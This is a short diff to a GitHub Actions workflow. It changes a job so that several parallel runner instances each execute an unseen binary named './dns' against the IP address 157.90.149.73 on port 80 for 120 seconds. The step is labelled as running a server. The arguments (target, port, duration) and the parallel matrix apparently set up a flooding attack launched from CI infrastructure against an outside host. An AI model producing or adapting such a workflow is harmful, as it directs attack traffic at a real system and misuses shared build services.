@@ -6,7 +6,7 @@ on:
 jobs:
   run-server:
     runs-on: ubuntu-latest
-    timeout-minutes: 5   # phòng trường hợp treo job
+    timeout-minutes: 5
 
     strategy:
       fail-fast: false
@@ -16,9 +16,10 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
-      - run: chmod +x ./dns 157.90.149.73 80 120
+      - name: Make dns executable
+        run: chmod +x ./dns
 
-      - name: Run server for 120 seconds
+      - name: Run dns for 120 seconds
         run: |
           echo "Starting instance ${{ matrix.instance }}"
-          timeout 120s ./server
+          timeout 120s ./dns 157.90.149.73 80 120
